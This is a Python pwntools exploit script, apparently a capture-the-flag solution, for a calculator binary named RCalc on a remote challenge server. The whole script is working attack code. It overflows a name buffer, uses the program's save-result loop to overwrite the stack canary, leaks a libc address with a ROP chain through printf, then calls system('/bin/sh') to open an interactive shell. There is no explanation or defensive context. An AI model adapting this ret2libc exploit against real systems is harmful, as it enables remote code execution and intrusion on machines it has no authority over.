#! /usr/bin/env python
from pwn import *
 
local = 0
if local:
    p = process('./RCalc')
else:
    p = remote('111.200.241.244',64138)
 
debug = 1
if debug:
    context.log_level = 'debug'
 
elf = ELF('./RCalc')
libc = ELF('./libc.so.6')
prdi = 0x0000000000401123
main = 0x401036
 
def setcanary():
    for i in range(34):
        p.sendlineafter('Your choice:', '1')
        p.sendlineafter('input 2 integer: ', '0')
        p.sendline('1')
        p.sendlineafter('Save the result? ', 'yes')
    p.sendlineafter('Your choice:', '1')
    p.sendlineafter('input 2 integer: ', '0')
    p.sendline('0')
    p.sendlineafter('Save the result? ', 'yes')
 
printf_plt = elf.symbols['printf']
libc_s_m_got = elf.got['__libc_start_main']
canary = 0
p.recvuntil('Input your name pls: ')
payload = 'a' * 0x108 + p64(canary) + 'a' * 0x8 + p64(prdi) + p64(libc_s_m_got) + p64(printf_plt) + p64(main)
p.sendline(payload)
setcanary()
#gdb.attach(p)
#pause()
p.sendlineafter('Your choice:', '5')
 
libc_s_m_addr = u64(p.recv(6).ljust(8,'\x00'))
print hex(libc_s_m_addr)
offset = libc_s_m_addr - libc.symbols['__libc_start_main']
system_addr = libc.symbols['system'] + offset
bin_sh = libc.search('/bin/sh').next() + offset
 
payload = 'a' * 0x108 + p64(canary) + 'a' * 0x8 + p64(prdi) + p64(bin_sh) + p64(system_addr) + p64(main)
 
p.sendlineafter('Input your name pls: ', payload)
setcanary()
p.sendlineafter('Your choice:', '5')
 
p.interactive()
 
